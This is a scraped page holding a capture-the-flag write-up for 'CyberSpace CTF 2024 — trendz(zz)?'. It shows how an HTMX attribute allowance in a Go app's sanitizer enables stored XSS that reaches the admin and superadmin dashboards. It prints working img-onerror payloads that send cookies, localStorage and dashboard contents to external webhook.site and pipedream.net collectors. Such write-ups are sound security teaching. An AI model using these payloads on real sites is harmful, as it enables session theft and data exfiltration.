1.986-1.145.152-2.209-.07-3.143-.77-.865-.655-1.356-1.52-1.484-2.595-.152-1.274.222-2.419.993-3.424.83-1.086 1.928-1.776 3.272-2.02 1.098-.2 2.15-.07 3.096.571.62.41 1.063.97 1.356 1.648.07.105.023.164-.117.2m3.868 6.461c-1.064-.024-2.034-.328-2.852-1.029a3.665 3.665 0 01-1.262-2.255c-.21-1.32.152-2.489.947-3.529.853-1.122 1.881-1.706 3.272-1.95 1.192-.21 2.314-.095 3.33.595.923.63 1.496 1.484 1.648 2.605.198 1.578-.257 2.863-1.344 3.962-.771.783-1.718 1.273-2.805 1.495-.315.06-.63.07-.934.106zm2.78-4.72c-.011-.153-.011-.27-.034-.387-.21-1.157-1.274-1.81-2.384-1.554-1.087.245-1.788.935-2.045 2.033-.21.912.234 1.835 1.075 2.21.643.28 1.285.244 1.905-.07.923-.48 1.425-1.228 1.484-2.233z"></path></svg> <!-- -->go<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token keyword">package</span><span class=""> dashboard
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">2</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">3</span><span class=""></span><span class="token keyword">import</span><span class=""> </span><span class="token punctuation">(</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">4</span><span class="">	</span><span class="token string">&quot;app/handlers/service&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="">	</span><span class="token string">&quot;os&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">6</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="">	</span><span class="token string">&quot;github.com/gin-gonic/gin&quot;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class=""></span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span>
<span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class=""></span><span class="token keyword">func</span><span class=""> </span><span class="token function">AdminDashboard</span><span class="token punctuation">(</span><span class="">ctx </span><span class="token operator">*</span><span class="">gin</span><span class="token punctuation">.</span><span class="">Context</span><span class="token punctuation">)</span><span class=""> </span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">	posts </span><span class="token operator">:=</span><span class=""> service</span><span class="token punctuation">.</span><span class="token function">GetAllPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="">	ctx</span><span class="token punctuation">.</span><span class="token function">HTML</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class=""> </span><span class="token string">&quot;adminDash.tmpl&quot;</span><span class="token punctuation">,</span><span class=""> gin</span><span class="token punctuation">.</span><span class="">H</span><span class="token punctuation">{</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="">		</span><span class="token string">&quot;flag&quot;</span><span class="token punctuation">:</span><span class="">  os</span><span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">&quot;ADMIN_FLAG&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="">		</span><span class="token string">&quot;posts&quot;</span><span class="token punctuation">:</span><span class=""> posts</span><span class="token punctuation">,</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="">	</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>because the superadmin is also an admin, we can use the same XSS to fetch <code class="opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]">/admin/dashboard</code> and get the part 1 flag:</p>
<div class="border border-white/10 rounded-lg my-2"><p class="flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="text-sm mr-1.5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M1.5 0h21l-1.91 21.563L11.977 24l-8.564-2.438L1.5 0zm7.031 9.75l-.232-2.718 10.059.003.23-2.622L5.412 4.41l.698 8.01h9.126l-.326 3.426-2.91.804-2.955-.81-.188-2.11H6.248l.33 4.171L12 19.351l5.379-1.443.744-8.157H8.531z"></path></svg> <!-- -->html<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="token tag punctuation">&lt;</span><span class="token tag">img</span><span class="token tag"> </span><span class="token tag attr-name">src</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value">x</span><span class="token tag"> </span><span class="token tag special-attr attr-name">onerror</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&#x27;</span><span class="token tag special-attr attr-value value javascript language-javascript function">fetch</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript template-string string">/admin/dashboard</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">then</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript parameter">x</span><span class="token tag special-attr attr-value value javascript language-javascript arrow operator">=&gt;</span><span class="token tag special-attr attr-value value javascript language-javascript">x</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">text</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">.</span><span class="token tag special-attr attr-value value javascript language-javascript method function property-access">then</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript parameter">x</span><span class="token tag special-attr attr-value value javascript language-javascript arrow operator">=&gt;</span><span class="token tag special-attr attr-value value javascript language-javascript function">fetch</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript template-string string">https://enhs7ezpdsxpw.x.pipedream.net/</span><span class="token tag special-attr attr-value value javascript language-javascript template-string template-punctuation string">`</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript operator">+</span><span class="token tag special-attr attr-value value javascript language-javascript"> </span><span class="token tag special-attr attr-value value javascript language-javascript function">btoa</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">(</span><span class="token tag special-attr attr-value value javascript language-javascript">x</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value value javascript language-javascript punctuation">)</span><span class="token tag special-attr attr-value punctuation">&#x27;</span><span class="token tag punctuation">&gt;</span></code></pre></div></div></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/webpack-d11e0b30904b49ad.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[87555,[],\"\"]\n3:I[31295,[],\"\"]\n4:I[6874,[\"874\",\"static/chunks/874-3e820bd666038662.js\",\"633\",\"static/chunks/app/writeups/%5Bid%5D/layout-2577bd3482649595.js\"],\"\"]\n6:I[59665,[],\"OutletBoundary\"]\n8:I[74911,[],\"AsyncMetadataOutlet\"]\na:I[59665,[],\"ViewportBoundary\"]\nc:I[59665,[],\"MetadataBoundary\"]\nd:\"$Sreact.suspense\"\nf:I[28393,[],\"\"]\n:HL[\"/_next/static/media/e4af272ccee01ff0-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/css/154fc5c9afe7044c.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"_83vPXOkMR3lkYoiZBeYt\",\"p\":\"\",\"c\":[\"\",\"writeups\",\"5af97a38d168d540bda2e5b3ae1324bf\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"5af97a38d168d540bda2e5b3ae1324bf\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/154fc5c9afe7044c.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":\"$undefined\"}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[\"writeups\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"id\",\"5af97a38d168d540bda2e5b3ae1324bf\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",null,[\"$\",\"$L6\",null,{\"children\":[\"$L7\",[\"$\",\"$L8\",null,{\"promise\":\"$@9\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$La\",null,{\"children\":\"$Lb\"}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]],[\"$\",\"$Lc\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$d\",null,{\"fallback\":null,\"children\":\"$Le\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"b:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n7:null\n"])</script><script>self.__next_f.push([1,"10:I[50674,[\"263\",\"static/chunks/bc9c3264-6371ca03223855d4.js\",\"810\",\"static/chunks/48507feb-8452885980bba250.js\",\"330\",\"static/chunks/08ffe114-f47006c90e36a3eb.js\",\"800\",\"static/chunks/800-bd0deb6e7b7e903a.js\",\"134\",\"static/chunks/app/writeups/%5Bid%5D/page-54fe20cc7a9d3224.js\"],\"default\"]\n11:T693,"])</script><script>self.__next_f.push([1,"package main\n\nimport (\n\t\"app/handlers/custom\"\n\t\"app/handlers/dashboard\"\n\t\"app/handlers/db\"\n\t\"app/handlers/jwt\"\n\t\"app/handlers/service\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\nfunc main() {\n\ts := gin.Default()\n\ts.LoadHTMLGlob(\"templates/*\")\n\tdb.InitDBconn()\n\tjwt.InitJWT()\n\n\ts.GET(\"/\", func(c *gin.Context) {\n\t\tc.Redirect(302, \"/login\")\n\t})\n\ts.GET(\"/ping\", func(c *gin.Context) {\n\t\tc.JSON(200, gin.H{\n\t\t\t\"message\": \"pong\",\n\t\t})\n\t})\n\tr := s.Group(\"/\")\n\tr.POST(\"/register\", service.CreateUser)\n\tr.GET(\"/register\", func(c *gin.Context) {\n\t\tc.HTML(200, \"register.tmpl\", gin.H{})\n\t})\n\tr.POST(\"/login\", service.LoginUser)\n\tr.GET(\"/login\", func(c *gin.Context) {\n\t\tc.HTML(200, \"login.tmpl\", gin.H{})\n\t})\n\n\tr.GET(\"/getAccessToken\", service.GenerateAccessToken)\n\n\tauthorizedEndpoints := r.Group(\"/user\")\n\tauthorizedEndpoints.Use(service.AuthorizeAccessToken())\n\tauthorizedEndpoints.GET(\"/dashboard\", dashboard.UserDashboard)\n\tauthorizedEndpoints.POST(\"/posts/create\", service.CreatePost)\n\tauthorizedEndpoints.GET(\"/posts/:postid\", service.ShowPost)\n\tauthorizedEndpoints.GET(\"/flag\", service.DisplayFlag)\n\n\tadminEndpoints := r.Group(\"/admin\")\n\tadminEndpoints.Use(service.AuthorizeAccessToken())\n\tadminEndpoints.Use(service.ValidateAdmin())\n\tadminEndpoints.GET(\"/dashboard\", dashboard.AdminDashboard)\n\n\tSAEndpoints := r.Group(\"/superadmin\")\n\tSAEndpoints.Use(service.AuthorizeAccessToken())\n\tSAEndpoints.Use(service.ValidateAdmin())\n\tSAEndpoints.Use(service.AuthorizeRefreshToken())\n\tSAEndpoints.Use(service.ValidateSuperAdmin())\n\tSAEndpoints.GET(\"/viewpost/:postid\", dashboard.ViewPosts)\n\tSAEndpoints.GET(\"/dashboard\", dashboard.SuperAdminDashboard)\n\ts.NoRoute(custom.Custom404Handler)\n\ts.Run(\":8000\")\n}"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"CyberSpace CTF 2024 — trendz(zz)?\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"The latest trendz is all about Go and HTMX, but what could possibly go wrong? A secret post has been hidden deep within the application. Your mission is to uncover it.\"}],\"\\n\"]}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-1\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Notice anything off in this application? If you suspect something is wrong, report it to the superadmin. You never know what secrets might be uncovered.\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"nc trendz-bot.challs.csc.tf 1337\"}]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a Go server that looks like this:\"}],\"\\n\",[\"$\",\"$L10\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"$11\",\"language\":\"go\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"This is a 3 part challenge: we can make and share posts, and for part 3 we can report \\\"suspicious posts\\\" to the super admin via \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"nc\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":\"Looking in the posts service, we can find a suspicious sanitize function looking like so:\"}],\"\\n\",[\"$\",\"$L10\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"func SanitizeData(data string) string {\\n\\tp := bluemonday.NewPolicy()\\n\\tp.AllowURLSchemesMatching(regexp.MustCompile(\\\"^https?\\\"))\\n\\tp.AllowAttrs(\\\"alt\\\", \\\"cite\\\", \\\"datetime\\\", \\\"dir\\\", \\\"high\\\", \\\"hx-delete\\\", \\\"hx-get\\\", \\\"hx-patch\\\", \\\"hx-post\\\", \\\"hx-put\\\", \\\"hx-swap\\\", \\\"hx-target\\\", \\\"hx-trigger\\\", \\\"hx-vals\\\", \\\"id\\\", \\\"low\\\", \\\"map\\\", \\\"max\\\", \\\"min\\\", \\\"name\\\", \\\"optimum\\\", \\\"value\\\").OnElements(\\\"a\\\", \\\"abbr\\\", \\\"acronym\\\", \\\"b\\\", \\\"br\\\", \\\"cite\\\", \\\"code\\\", \\\"dfn\\\", \\\"div\\\", \\\"em\\\", \\\"figcaption\\\", \\\"h1\\\", \\\"h2\\\", \\\"h3\\\", \\\"h4\\\", \\\"h5\\\", \\\"h6\\\", \\\"hgroup\\\", \\\"hr\\\", \\\"i\\\", \\\"mark\\\", \\\"p\\\", \\\"pre\\\", \\\"s\\\", \\\"samp\\\", \\\"small\\\", \\\"span\\\", \\\"strike\\\", \\\"strong\\\", \\\"sub\\\", \\\"sup\\\", \\\"tt\\\", \\\"var\\\", \\\"wbr\\\")\\n\\thtml := p.Sanitize(data)\\n\\treturn html\\n}\\n\\nfunc ShowPost(ctx *gin.Context) {\\n\\tpostID := ctx.Param(\\\"postid\\\")\\n\\tDB := db.GetDBconn()\\n\\tvar title string\\n\\tvar data string\\n\\terr := DB.QueryRow(\\\"SELECT title, data FROM posts WHERE postid = $1\\\", postID).Scan(\u0026title, \u0026data)\\n\\tif err != nil {\\n\\t\\tfmt.Println(err)\\n\\t}\\n\\thtml := SanitizeData(data)\\n\\tctx.PureJSON(200, gin.H{\\n\\t\\t\\\"title\\\": title, \\\"data\\\": html})\\n}\",\"language\":\"go\"}],\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\",\"\\n\",\"$L24\"]}]}]\n"])</script><script>self.__next_f.push([1,"12:[\"$\",\"p\",\"p-3\",{\"children\":[\"It looks like our post data is directly rendered to the DOM via \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"innerHTML\"}],\", but we're only allowed to use certain allowed tags and attributes defined by the sanitation policy.\"]}]\n13:[\"$\",\"p\",\"p-4\",{\"children\":[\"Suspiciously, among the allowed attributes are HTMX-specific attributes like \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://htmx.org/attributes/hx-get/\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"hx-get\"}]}],\". Reading the documentation,\"]}]\n14:[\"$\",\"blockquote\",\"blockquote-2\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"hx-get\"}],\" attribute will cause an element to issue a \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"GET\"}],\" to the specified URL and swap the HTML into the DOM using a swap strategy:\"]}],\"\\n\"]}]\n15:[\"$\",\"p\",\"p-5\",{\"children\":[\"Then, we can circumvent the sanitizer by using \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"hx-get\"}],\" to fetch our malicious payload via network request and swap it in to the DOM, giving us XSS.\"]}]\n"])</script><script>self.__next_f.push([1,"16:[\"$\",\"p\",\"p-6\",{\"children\":[\"By default, this swapping only triggers when the element is clicked, but we can use the \",[\"$\",\"a\",\"a-0\",{\"href\":\"https://htmx.org/attributes/hx-trigger/\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"hx-trigger\"}]}],\" property to swap in our payload on mount. Worse, however, is that \",[\"$\",\"a\",\"a-1\",{\"href\":\"https://htmx.org/reference/#config\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"htmx.config.selfRequestsOnly\"}],\" defaults to \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"true\"}]]}],\", meaning that we can only send HTMX GET requests to the same domain.\"]}]\n"])</script><script>self.__next_f.push([1,"17:[\"$\",\"p\",\"p-7\",{\"children\":[\"We can host semi-arbitrary data on the same domain via posts, but we unfortunately can't simply put our payload in the post data due to the sanitizer. Instead, we can make a post with arbitrary data whose \",[\"$\",\"em\",\"em-0\",{\"children\":\"title\"}],\" is our malicious payload, e.g.\"]}]\n18:[\"$\",\"$L10\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"\u003cimg src=x onerror='fetch(`https://webhook.site/e9569dad-ec09-4b1f-8125-3e35e1edd678?a=` + document.cookie + JSON.stringify(localStorage))'\u003e\",\"language\":\"html\"}]\n19:[\"$\",\"p\",\"p-8\",{\"children\":\"(making sure not to use double quotes lest the payload get JSON-escaped).\"}]\n1a:[\"$\",\"p\",\"p-9\",{\"children\":\"Then, our malicious post data would look something like\"}]\n1b:[\"$\",\"$L10\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"\u003cdiv hx-get=\\\"/user/posts/5b3f1b37-3c01-4051-9a7f-1bbc020668e6\\\" hx-trigger=\\\"load\\\" hx-swap=\\\"innerHTML\\\"\u003e\u003c/div\u003e\",\"language\":\"html\"}]\n1c:[\"$\",\"p\",\"p-10\",{\"children\":[\"swapping in the first posts's title and data into its \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"innerHTML\"}],\" for XSS.\"]}]\n1d:[\"$\",\"p\",\"p-11\",{\"children\":\"Looking at the superadmin dashboard,\"}]\n1e:[\"$\",\"$L10\",\"pre-4\",{\"className\":\"my-2\",\"children\":\"package dashboard\\n\\nimport (\\n\\t\\\"fmt\\\"\\n\\t\\\"os\\\"\\n\\n\\t\\\"github.com/gin-gonic/gin\\\"\\n)\\n\\nfunc SuperAdminDashboard(ctx *gin.Context) {\\n\\tfmt.Println(\\\"SuperAdmin dashboard accessed\\\")\\n\\tctx.HTML(200, \\\"superAdminDash.tmpl\\\", gin.H{\\n\\t\\t\\\"flag\\\": os.Getenv(\\\"SUPERADMIN_FLAG\\\"),\\n\\t})\\n}\\n\\nfunc ViewPosts(ctx *gin.Context) {\\n\\tctx.HTML(200, \\\"viewPost.tmpl\\\", gin.H{\\n\\t\\t\\\"PostID\\\": ctx.Param(\\\"postid\\\"),\\n\\t\\t\\\"title\\\":  \\\"Click\\\",\\n\\t\\t\\\"data\\\":   \\\"{{data|safe}}\\\",\\n\\t})\\n}\",\"language\":\"go\"}]\n1f:[\"$\",\"p\",\"p-12\",{\"children\":[\"it looks like sending the superadmin to \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"/superadmin/viewpost/{our malicious post id}\"}],\" causes our payload to be \",[\"$\",\"a\",\"a-0\",{\"hre"])</script><script>self.__next_f.push([1,"f\":\"https://mozilla.github.io/nunjucks/templating.html#safe\",\"children\":\"rendered into the DOM for XSS\"}],\", from where we can fetch \",[\"$\",\"code\",\"code-1\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"/superadmin/dashboard\"}],\" to get the part 3 flag. Here's a payload that does just that:\"]}]\n20:[\"$\",\"$L10\",\"pre-5\",{\"className\":\"my-2\",\"children\":\"\u003cimg src=x onerror='fetch(`/superadmin/dashboard`).then(x=\u003ex.text()).then(x=\u003efetch(`https://enhs7ezpdsxpw.x.pipedream.net/` + btoa(x)))'\u003e\",\"language\":\"html\"}]\n21:[\"$\",\"p\",\"p-13\",{\"children\":[\"Looking in \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"AdminDash.go\"}],\",\"]}]\n22:[\"$\",\"$L10\",\"pre-6\",{\"className\":\"my-2\",\"children\":\"package dashboard\\n\\nimport (\\n\\t\\\"app/handlers/service\\\"\\n\\t\\\"os\\\"\\n\\n\\t\\\"github.com/gin-gonic/gin\\\"\\n)\\n\\nfunc AdminDashboard(ctx *gin.Context) {\\n\\tposts := service.GetAllPosts()\\n\\tctx.HTML(200, \\\"adminDash.tmpl\\\", gin.H{\\n\\t\\t\\\"flag\\\":  os.Getenv(\\\"ADMIN_FLAG\\\"),\\n\\t\\t\\\"posts\\\": posts,\\n\\t})\\n}\",\"language\":\"go\"}]\n23:[\"$\",\"p\",\"p-14\",{\"children\":[\"because the superadmin is also an admin, we can use the same XSS to fetch \",[\"$\",\"code\",\"code-0\",{\"className\":\"opacity-75 bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"/admin/dashboard\"}],\" and get the part 1 